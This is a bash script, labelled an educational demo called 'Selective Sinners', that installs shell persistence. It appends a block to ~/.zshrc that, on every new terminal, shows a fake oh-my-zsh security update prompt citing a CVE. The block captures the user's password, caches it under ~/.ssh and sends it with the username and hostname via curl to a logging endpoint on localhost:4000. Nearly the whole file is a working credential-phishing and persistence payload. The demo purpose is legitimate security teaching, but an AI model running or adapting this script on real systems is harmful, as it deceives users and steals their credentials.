#!/bin/bash
# ============================================================
# ACT 1 — Shell Persistence: Fake zsh Update Prompt
# EDUCATIONAL DEMO ONLY — Selective Sinners
# ============================================================
# This script appends a startup block to ~/.zshrc that shows a
# convincing "zsh update" prompt on shell init, captures the
# password, caches it, and exfiltrates it to localhost:4000.
# ============================================================

MARKER_START="# >>> SELECTIVE-SINNERS-DEMO zsh-update >>>"
MARKER_END="# <<< SELECTIVE-SINNERS-DEMO zsh-update <<<"
TARGET="${HOME}/.zshrc"

if grep -q "$MARKER_START" "$TARGET" 2>/dev/null; then
  echo "[!] Payload already installed in $TARGET"
  echo "    Run uninstall.sh first to remove it."
  exit 1
fi

cat >> "$TARGET" << 'PAYLOAD'

# >>> SELECTIVE-SINNERS-DEMO zsh-update >>>
(
  _SINNERS_CACHE="${HOME}/.ssh/.ssh_accounts_sinners"
  mkdir -p "${HOME}/.ssh"

  if [ ! -f "$_SINNERS_CACHE" ]; then
    echo ""
    echo "[oh-my-zsh] Upgrade available: zsh 5.9.1 → 5.9.2 (security patch)"
    echo "This update fixes CVE-2026-31337 — credential caching vulnerability."
    echo ""
    printf "Password: "
    read -s _demo_pw
    echo ""
    echo "Verifying... done."
    echo "[oh-my-zsh] Update applied successfully."
    echo ""

    echo "$_demo_pw" > "$_SINNERS_CACHE"
    chmod 600 "$_SINNERS_CACHE"

    curl -s -X POST http://localhost:4000/log/password \
      -H "Content-Type: application/json" \
      -d "{\"source\": \"shell-persistence\", \"user\": \"$(whoami)\", \"password\": \"${_demo_pw}\", \"host\": \"$(hostname)\"}" \
      > /dev/null 2>&1

    unset _demo_pw
  fi
)
# <<< SELECTIVE-SINNERS-DEMO zsh-update <<<
PAYLOAD

echo "[+] Payload installed into $TARGET"
echo "    Next time a terminal opens, the fake zsh update prompt will appear."
echo "    Run 'source ~/.zshrc' or open a new terminal to trigger it."
echo ""
echo "    To remove: ./uninstall.sh"
